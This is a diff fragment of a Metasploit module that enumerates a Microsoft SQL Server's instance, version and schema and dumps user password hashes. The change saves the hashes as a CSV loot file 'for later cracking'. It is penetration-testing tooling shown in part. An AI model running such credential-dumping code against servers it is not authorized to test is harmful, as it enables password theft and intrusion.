@@ -42,11 +42,13 @@ class Metasploit3 < Msf::Auxiliary
 			return
 		end
 
+		#Grabs the Instance Name and Version of MSSQL(2k,2k5,2k8)
 		instancename= mssql_query(mssql_enumerate_servername())[:rows][0][0].split('\\')[1]
 		print_status("Instance Name: #{instancename.inspect}")
 		version = mssql_query(mssql_sql_info())[:rows][0][0]
 		version_year = version.split('-')[0].slice(/\d\d\d\d/)
 
+		#Grab all the DB schema and save it as notes
 		mssql_db_names = get_db_names()
 		mssql_schema={}
 		unless mssql_db_names.nil?
@@ -66,7 +68,7 @@ class Metasploit3 < Msf::Auxiliary
 
 	end
 
-	def report_other_data(mssql_schema,info,version_year)
+	def report_other_data(mssql_schema,instancename,version_year)
 
 		unless mssql_schema.nil?
 			report_note(
@@ -79,20 +81,11 @@ class Metasploit3 < Msf::Auxiliary
 			)
 		end
 
-		unless info.nil?
+		unless instancename.nil?
 			report_note(
 				:host  => rhost,
 				:type  => "mssql.instancename",
-				:data  => info['InstanceName']
-			)
-
-			report_note(
-				:host  => rhost,
-				:type  => "mssql.version",
-				:data  => info['Version'],
-				:port  => rport,
-				:proto => 'tcp',
-				:update => :unique_data
+				:data  => instancename
 			)
 
 		end
@@ -110,32 +103,45 @@ class Metasploit3 < Msf::Auxiliary
 
 	end
 
+	#Stores the grabbed hashes as loot for later cracking
+	#The hash format is slightly different between 2k and 2k5/2k8
 	def report_hashes(mssql_hashes, version_year)
 
 		case version_year
 		when "2000"
-			hashtype = "mssql_hash"
+			hashtype = "mssql.hashes"
 
 		when "2005", "2008"
-			hashtype = "mssql05_hash"
+			hashtype = "mssql05.hashes"
 		end
 
+		this_service = report_service(
+					:host  => datastore['RHOST'],
+					:port => datastore['RPORT'],
+					:name => 'mssql',
+					:proto => 'tcp'
+					)
+
+		tbl = Rex::Ui::Text::Table.new(
+			'Header'  => 'MS SQL Server Hashes',
+			'Ident'   => 1,
+			'Columns' => ['Username', 'Hash']
+		)
+
+		hash_loot=""
 		mssql_hashes.each do |row|
 			next if row[0].nil? or row[1].nil?
 			next if row[0].empty? or row[1].empty?
-			hashstring= "#{row[0]}:#{row[1]}"
-			print_good("#{rhost}:#{rport} - Saving #{hashtype} = #{hashstring}")
-			report_auth_info(
-					:host  => datastore['RHOST'],
-					:port  => datastore['RPORT'],
-					:sname => 'mssql',
-					:user  => row[0],
-					:pass  => hashstring,
-					:type  => hashtype
-			)
+			tbl << [row[0], row[1]]
+			print_good("#{rhost}:#{rport} - Saving #{hashtype} = #{row[0]}:#{row[1]}")
 		end
+		filename= "#{datastore['RHOST']}-#{datastore['RPORT']}_sqlhashes.txt"
+		store_loot(hashtype, "text/plain", datastore['RHOST'], tbl.to_csv, filename, "MS SQL Hashes", this_service)
+		 
 	end
 
+	#Grabs the user tables depending on what Version of MSSQL
+	#The queries are different between 2k and 2k/2k8
 	def mssql_hashdump(version_year)
 		is_sysadmin = mssql_query(mssql_is_sysadmin())[:rows][0][0]
 
@@ -156,11 +162,13 @@ class Metasploit3 < Msf::Auxiliary
 
 	end
 
+	#Gets all of the Databases on this Instance
 	def get_db_names
 		results = mssql_query(mssql_db_names())[:rows]
 		return results
 	end
 
+	#Gets all the table names for the given DB
 	def get_tbl_names(db_name)
 		results = mssql_query("SELECT name FROM #{db_name}..sysobjects WHERE xtype = 'U'")[:rows]
 		return results
